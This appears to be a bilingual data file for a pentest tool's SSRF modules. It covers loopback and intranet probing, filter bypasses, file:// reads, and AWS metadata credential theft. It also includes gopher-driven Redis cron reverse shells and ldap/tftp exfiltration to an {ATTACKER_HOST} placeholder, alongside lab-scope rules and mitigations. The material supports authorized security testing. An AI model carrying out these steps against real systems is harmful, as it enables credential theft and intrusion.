exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步的回环 URL 提交到注入点，响应内容、状态码或耗时与基线不同即确认可达本机服务；再用第 2 步逐端口区分监听服务；第 3 步探测内网管理台，返回登录页即确认内网面板可触达；第 4 步用 file:// 读本地文件验证 scheme 未被过滤。命中 WAF 拦截时查看 wafBypass 替换变体；命令中的占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: first submit the loopback URLs from step 1 to the injection point; a response body, status code, or timing different from the baseline confirms reachability of local services. Then use step 2 to differentiate listening services port by port; step 3 probes internal admin consoles — a returned login page confirms the panel is reachable; step 4 uses file:// to read local files and prove the scheme is not filtered. On WAF blocks, consult wafBypass for replacement variants; replace placeholders in the commands via the global variables menu.

mitigation.zh: 只允许业务必需的 http/https 协议与端口，解析后阻断回环、链路本地、私网和保留地址，连接时固定 IP 并在每次重定向后复检；禁止用户控制敏感请求头，并经网络策略隔离元数据、数据库与管理网段。修复后用第 1、4 步样例回归，合法功能保留且回环与 file 读取被拒绝。
mitigation.en: Allow only business-required http/https schemes and ports, block loopback, link-local, private, and reserved addresses after resolution, pin the connected IP, and re-check after every redirect; forbid user control of sensitive headers and isolate metadata, database, and management segments via network policy. After the fix, regress with the step 1 and step 4 samples: legitimate features remain and loopback and file reads are denied.

title.zh: 探测回环服务锁定出站可控
title.en: Probe loopback services to confirm outbound control

description.zh: 把 http://127.0.0.1/、http://localhost/ 等回环地址逐一提交到注入点并比对响应；任一地址返回有效内容或非超时状态，即证明服务端出站请求受输入控制。
description.en: Submit loopback URLs such as http://127.0.0.1/ and http://localhost/ to the injection point and compare responses; any valid content or non-timeout response proves the server's outbound request is attacker-controlled.

title.zh: 变形地址绕过回环过滤
title.en: Bypass loopback filters with address variants

description.zh: 若明文回环地址被拦截，改用 0177.0.0.1、2130706433、0x7f000001 等进制变形重放；任一变形返回与第 1 步相同内容，即表明过滤仅做字面匹配可被绕过。
description.en: If plain loopback addresses are blocked, replay with radix variants like 0177.0.0.1, 2130706433 and 0x7f000001; any variant returning the same content as step 1 shows the filter matches literals only and can be bypassed.

title.zh: 扫描内网端口与管理面板
title.en: Scan intranet ports and admin panels

description.zh: 提交网关端口载荷探测 192.168.1.1 的 22/80/443/3306，再请求 /admin、:8080/manager 等管理台地址；命中登录页或特征接口即锁定可触达的内网资源。
description.en: Probe 22/80/443/3306 on the gateway with the port payloads, then request admin paths like /admin and :8080/manager; a login page or characteristic API response marks reachable intranet assets.

title.zh: 读取本地敏感文件

description.zh: 向注入点提交 file:///etc/passwd、file:///c:/windows/win.ini 等 URI；回显账户列表或配置段落即证明 file 协议可用，可继续拖取密钥与配置文件。
description.en: Submit file URIs such as file:///etc/passwd and file:///c:/windows/win.ini; echoed account lists or config sections prove the file scheme works, opening the way to key and config exfiltration.

analysis.zh: SSRF 最终连接目标验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Final-Destination Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 确认服务端取回器是否允许用户输入改变解析地址、最终连接 IP、端口或重定向目标。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: AWS IMDSv2 SSRF 验证

description.zh: 覆盖 AWS 元数据服务的 SSRF 验证：从 IMDS 元数据与角色临时凭证读取，到 user-data 启动脚本获取，再到携带 token 的 IMDSv2 流程复现，用于确认云实例凭证与自定义数据是否可被窃取。
description.en: Covers SSRF validation against the AWS metadata service: from IMDS metadata and role temporary-credential reads through user-data startup script retrieval to token-carrying IMDSv2 flow replay, to confirm whether cloud instance credentials and custom data can be stolen.

prerequisites.zh: 确认 AWS IMDSv2 SSRF 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for AWS IMDSv2 SSRF Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: AWS IMDSv2 SSRF 验证覆盖云实例元数据窃取场景：针对部署在 EC2 上的服务端取回功能，验证注入点能否访问 169.254.169.254。验证维度涵盖 IMDS 元数据目录读取、角色临时凭证获取、user-data 启动脚本读取与携带 token 的 IMDSv2 流程复现。
overview.en: AWS IMDSv2 SSRF Validation covers cloud instance metadata theft: for a server-side fetch function deployed on EC2, verify whether the injection point can reach 169.254.169.254. Verification dimensions cover IMDS metadata directory reads, role temporary credential retrieval, user-data startup script reads, and replaying the token-bearing IMDSv2 flow.

vulnerability.zh: 根因是服务端可发起出站请求且网络层允许到达链路本地的 IMDS，攻击者借此读取实例身份、附加角色的临时 AccessKeyId/SecretAccessKey，以及 user-data 中可能残留的密钥；IMDSv2 的 PUT token 流程同样可被 SSRF 逐步复现。
vulnerability.en: The root cause is that the server can issue outbound requests and the network layer permits reaching the link-local IMDS, letting an attacker read the instance identity, the attached role's temporary AccessKeyId/SecretAccessKey, and any secrets left in user-data; the IMDSv2 PUT token flow can likewise be replayed step by step via SSRF.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步访问元数据根路径，返回 instance-id 等目录字段即确认 IMDS 可达；第 2 步先枚举已附加角色名，再读取该角色的临时凭证 JSON，拿到 AccessKeyId 即确认凭证可窃取；第 3 步读取 user-data 检查是否残留密钥；第 4 步先 PUT 获取带 TTL 的 token，再携带 X-aws-ec2-metadata-token 头复现 v2 流程。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 accesses the metadata root path — returned directory fields such as instance-id confirm IMDS reachability; step 2 enumerates the attached role name, then reads that role's temporary credential JSON — obtaining an AccessKeyId confirms credential theft; step 3 reads user-data to check for leftover secrets; step 4 first PUTs for a TTL token, then replays the v2 flow with the X-aws-ec2-metadata-token header. Replace placeholders via the global variables menu.

mitigation.zh: 将实例元数据强制为 IMDSv2 并把 token hop limit 设为 1，阻断工作负载到链路本地的非必要出站；附加角色只授予最小权限并定期轮换。修复后用第 1、2 步样例回归，元数据请求应在网络层被拒绝或无法取得角色凭证。
mitigation.en: Enforce IMDSv2 for instance metadata with a token hop limit of 1, and block unnecessary egress from workloads to the link-local address; grant attached roles least privilege and rotate them. After the fix, regress with the step 1 and step 2 samples: metadata requests should be denied at the network layer or yield no role credentials.

title.zh: 探测实例元数据服务

description.zh: 提交 http://169.254.169.254/latest/meta-data/ 到注入点；返回 ami-id、hostname 等元数据目录即确认元数据服务可达，SSRF 已能触达云层。
description.en: Submit http://169.254.169.254/latest/meta-data/; a directory listing with ami-id and hostname confirms the metadata service is reachable and the SSRF extends into the cloud layer.

title.zh: 变形地址绕过元数据过滤
title.en: Bypass metadata filtering with address variants

description.zh: 若链路本地地址被拦截，改用 2852039166、0xA9FEA9FE、[::ffff:169.254.169.254] 等变形重访；任一写法返回元数据目录即绕过基于字面 IP 的过滤规则。
description.en: If link-local addresses are blocked, revisit with variants like 2852039166, 0xA9FEA9FE and [::ffff:169.254.169.254]; any variant returning the metadata directory defeats the literal-IP filter.

title.zh: 窃取 IAM 角色临时凭证

description.zh: 沿 /iam/security-credentials/ 路径先列出角色名再请求具体角色；响应出现 AccessKeyId、SecretAccessKey、Token 字段即拿到实例角色的临时凭证。
description.en: Walk /iam/security-credentials/ to list roles, then request the role path; AccessKeyId, SecretAccessKey and Token fields in the response yield the instance role's temporary credentials.

title.zh: 攻破 IMDSv2 令牌防护

description.zh: 对启用 IMDSv2 的实例先用 PUT /latest/api/token 并携带 TTL 头换取 token，再带 token 重访元数据接口；返回元数据内容即 v2 强制校验被绕过。
description.en: For IMDSv2 instances, PUT /latest/api/token with the TTL header to mint a token, then revisit metadata with it; metadata content in the response means the v2 enforcement is defeated.

title.zh: 拖取 user-data 启动脚本

description.zh: 请求 /latest/user-data/ 读取实例初始化脚本；返回内容中的数据库口令、API 密钥即成为进入内网与云下资源的第二把钥匙。
description.en: Request /latest/user-data/ to read the bootstrap script; database passwords and API keys inside become the second key into the intranet and downstream resources.

analysis.zh: AWS IMDSv2 SSRF 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: AWS IMDSv2 SSRF Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在自有 EC2 实验实例中验证取回器是否能执行 IMDSv2 令牌流程，并只读取低敏感度实例字段。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF 非 HTTP Scheme 边界

description.zh: 覆盖 SSRF 非 HTTP Scheme 边界验证：从 file:// 读取与 dict:// 端口探测，到 gopher:// 任意 TCP 报文构造，再到 ldap:// 与 tftp:// 出网确认，厘清各 Scheme 可达范围。
description.en: Covers non-HTTP scheme boundary validation for SSRF: from file:// reads and dict:// port probing through gopher:// arbitrary TCP frame construction to ldap:// and tftp:// egress confirmation, clarifying the reachable range of each scheme.

prerequisites.zh: 确认 SSRF 非 HTTP Scheme 边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Non-HTTP Scheme Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 非 HTTP Scheme 边界验证覆盖取回器协议面滥用场景：针对允许自定义 scheme 的 URL 注入点，逐一验证 file、dict、gopher、ldap 与 tftp 是否越过业务允许范围。验证维度从本地文件读取、端口命令交互，到任意 TCP 报文构造与出网确认。
overview.en: SSRF Non-HTTP Scheme Boundary Validation covers fetcher protocol-surface abuse: for URL injection points accepting custom schemes, verify one by one whether file, dict, gopher, ldap, and tftp exceed the business-allowed scope. Verification dimensions range from local file reads and port command interaction to arbitrary TCP packet construction and egress confirmation.

vulnerability.zh: 根因是应用未建立 scheme 允许列表时通用 URL 库自动启用非 HTTP 处理器：gopher 把百分号解码后的受控字节直接写入 TCP 套接字，dict 向内网协议端口发送命令行，file 则绕过网络边界交给本地文件系统读取。
vulnerability.en: The root cause is that without a scheme allowlist, general-purpose URL libraries automatically enable non-HTTP handlers: gopher writes percent-decoded attacker-controlled bytes straight to a TCP socket, dict sends command lines to internal protocol ports, and file bypasses the network boundary entirely by handing the path to the local filesystem.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 file:// 读 /etc/passwd 等文件，返回内容即确认 scheme 未被过滤；第 2 步用 dict:// 探测回环 Redis 与 Memcached，收到 INFO 或 stats 回显即确认可交互；第 3 步用 gopher 向隔离监听器发送 RESP 帧验证任意 TCP 字节转发；第 4、5 步把 ldap:// 与 tftp:// 指向回连主机确认出网能力。命中拦截时查看 wafBypass；占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 submits file:// for /etc/passwd and similar files — returned content confirms the scheme is unfiltered; step 2 probes loopback Redis and Memcached with dict:// — an INFO or stats reply confirms interactive access; step 3 sends a RESP frame to an isolated listener with gopher:// to prove arbitrary TCP byte forwarding; steps 4 and 5 point ldap:// and tftp:// at your callback host to confirm egress. On blocks, consult wafBypass; replace placeholders via the global variables menu.

mitigation.zh: URL 获取器只允许业务必需的 http/https，显式拒绝 file、gopher、dict 等协议；解析后阻断回环、私网与链路本地地址，网络层限制到数据库与内网服务端口的访问。修复后用第 1、2 步样例回归，全部非 HTTP scheme 都应被直接拒绝。
mitigation.en: Allow only business-required http/https in the URL fetcher and explicitly reject file, gopher, dict, and similar schemes; block loopback, private, and link-local addresses after resolution, and restrict database and internal service ports at the network layer. After the fix, regress with the step 1 and step 2 samples: every non-HTTP scheme should be denied outright.

title.zh: 读取本地文件验证 file 协议
title.en: Verify the file scheme on local files

description.zh: 向注入点提交 file:///etc/passwd；响应回显账户文件内容即确认 file 协议可用，攻击面从 HTTP 扩展到本地文件读取。
description.en: Submit file:///etc/passwd to the injection point; echoed file content confirms the file scheme works, extending the attack surface from HTTP to local file reads.

title.zh: 大小写变形绕过协议过滤
title.en: Bypass scheme filters with case variants

description.zh: 若 file:// 被拦截，改用 FILE:///、File:/// 等大小写混合形式重放；仍能读出文件内容即表明过滤未对协议名做归一化处理。
description.en: If file:// is blocked, replay with mixed-case forms like FILE:/// and File:///; file content still returned shows scheme names are not normalized before filtering.

title.zh: dict 协议探测内网服务

description.zh: 提交 dict://127.0.0.1:6379/info 与 dict://127.0.0.1:11211/stats；回显版本与统计信息即分别确认 Redis、Memcached 未授权可达。
description.en: Submit dict://127.0.0.1:6379/info and dict://127.0.0.1:11211/stats; version and stats output confirm unauthenticated Redis and Memcached respectively.

title.zh: gopher 伪造 TCP 报文攻击内网
title.en: Craft raw TCP attacks with gopher

description.zh: 把 Redis 命令序列按 RESP 格式 URL 编码后拼入 gopher://127.0.0.1:6379/_ 提交；目标按命令执行即确认可伪造任意 TCP 交互报文。
description.en: URL-encode a Redis command sequence in RESP form and append it to gopher://127.0.0.1:6379/_; the target executing the commands proves arbitrary TCP traffic can be forged.

title.zh: 探测 ldap 与 tftp 外带通道
title.en: Probe ldap and tftp exfiltration channels

description.zh: 提交 ldap://{ATTACKER_HOST}/cn=test 与 tftp://{ATTACKER_HOST}/file；己方监听端收到连接或文件请求即建立非 HTTP 协议的数据外带通道。
description.en: Submit ldap://{ATTACKER_HOST}/cn=test and tftp://{ATTACKER_HOST}/file; a connection or file request hitting the listener establishes a non-HTTP exfiltration channel.

analysis.en: SSRF Non-HTTP Scheme Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

name.zh: SSRF Gopher TCP 标记验证与保留攻击样例
name.en: SSRF Gopher TCP Marker Validation and Retained Attack Samples

description.zh: 覆盖 gopher:// 任意 TCP 报文构造的边界验证：从捕获器确认 TCP 标记链路，到 Redis cron 写入持久化，再到 MySQL 3306 与 FastCGI 9000 端口可达性核对及 HTTP 桥接请求。
description.en: Covers boundary validation of arbitrary TCP frame construction via gopher://: from capture-based confirmation of the TCP marker chain through Redis cron-write persistence to reachability checks on MySQL 3306 and FastCGI 9000 plus bridged HTTP requests.

prerequisites.zh: 确认 SSRF Gopher TCP 标记验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Gopher TCP Marker Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Gopher TCP 标记验证覆盖任意 TCP 报文构造场景：针对支持 gopher:// 的取回器，验证可控字节能否经服务端转发到指定端口。验证维度包含 TCP 标记链路确认、Redis cron 写入持久化、MySQL 与 FastCGI 端口可达性核对及 HTTP 桥接请求五类变体。
overview.en: SSRF Gopher TCP Marker Validation covers arbitrary TCP packet construction: for fetchers supporting gopher://, verify whether controlled bytes can be forwarded through the server to a chosen port. Verification dimensions include TCP marker-link confirmation, Redis cron-write persistence, MySQL and FastCGI port reachability checks, and HTTP bridging requests — five variants in all.

vulnerability.zh: 根因是 gopher scheme 把百分号解码后的字节不经协议解释直接写入 TCP 连接，使取回器退化为任意协议客户端；无认证的 Redis、MySQL、FastCGI 等内网服务边界被逐层跨越，最终可写入 cron 计划任务形成持久化。
vulnerability.en: The root cause is that the gopher scheme writes percent-decoded bytes to the TCP connection without any protocol interpretation, degrading the fetcher into an arbitrary protocol client; unauthenticated internal services such as Redis, MySQL, and FastCGI are crossed layer by layer, culminating in cron jobs that establish persistence.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步向隔离捕获器发送文本标记，收到命令行与结尾标记即确认 TCP 字节链路可用；第 2 步在书面授权的实验环境复现 gopher 封装的 Redis cron 写入，反弹连接到达监听端口即确认持久化；第 3、4 步用无副作用标记核对 MySQL 3306 与 FastCGI 9000 的端口可达性；第 5 步用 gopher 桥接 HTTP 请求读取 /admin。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 sends a text marker to an isolated catcher — receiving the command line and trailing marker proves the TCP byte path; step 2 replays the gopher-wrapped Redis cron write in a written-authorized lab, and a reverse connection reaching your listener confirms persistence; steps 3 and 4 verify MySQL 3306 and FastCGI 9000 port reachability with side-effect-free markers; step 5 bridges an HTTP request via gopher to read /admin. Replace placeholders via the global variables menu.

mitigation.zh: 在获取器入口拒绝 gopher 等非业务协议，解析后阻断内网与回环目标，网络层隔离 Redis、MySQL、FastCGI 等服务；Redis 启用认证与 ACL 并禁用危险命令。修复后用第 1 步样例回归，捕获器不应再收到来自应用的任何字节。
mitigation.en: Reject gopher and other non-business schemes at the fetcher entrance, block internal and loopback targets after resolution, and isolate Redis, MySQL, and FastCGI at the network layer; enable Redis authentication and ACLs and disable dangerous commands. After the fix, regress with the step 1 sample: the catcher must receive no further bytes from the application.

title.zh: 模板探测 gopher 通道
title.en: Probe the gopher channel with a template

description.zh: 把目标地址端口与命令填入 gopher://{TARGET}:{TARGET_PORT}/_{COMMAND} 模板提交；返回命令响应或目标服务指纹即 gopher 通道可用。
description.en: Fill target host, port and command into the gopher://{TARGET}:{TARGET_PORT}/_{COMMAND} template; a command response or service fingerprint confirms the gopher channel works.

title.zh: 双重编码绕过载荷过滤
title.en: Evade payload filters with double encoding

description.zh: 若 %0d%0a 等控制字符被 WAF 拦截，把载荷整体再编码为 %250d%250a 后重放；目标服务仍按原始命令执行即过滤被绕过。
description.en: If control characters like %0d%0a are blocked by the WAF, re-encode the payload to %250d%250a and replay; the service still executing the original commands means the filter is bypassed.

title.zh: 写入 Redis 计划任务反弹
title.en: Plant a reverse-shell cron in Redis

description.zh: 用第 1 步通道提交 flushall 后写入 */1 * * * * bash 反弹语句并落盘 crontab；监听端收到 shell 即获得目标系统命令执行权。
description.en: Over the channel from step 1, flushall then set the */1 * * * * bash reverse line and land it in crontab; a shell on the listener grants system-level code execution on the target.

title.zh: 攻击 FastCGI 服务

description.zh: 向 {LAB_FASTCGI_HOST}:9000 发送 FCGI_GET_VALUES 探测报文；返回 FCGI_MAX_CONNS 等应答即确认 FastCGI 开放，可续发执行请求夺权。
description.en: Send an FCGI_GET_VALUES probe to {LAB_FASTCGI_HOST}:9000; FCGI_MAX_CONNS in the reply confirms FastCGI is open, ready for follow-up execution requests.

title.zh: 伪造内网 HTTP 请求

description.zh: 用 gopher 向目标 80 端口拼入 GET /admin 的完整 HTTP 报文；响应返回管理页内容即以服务端身份完成对受保护内网资源的访问。
description.en: Assemble a full GET /admin HTTP request into a gopher payload against port 80; admin page content in the response completes access to protected intranet resources as the server.
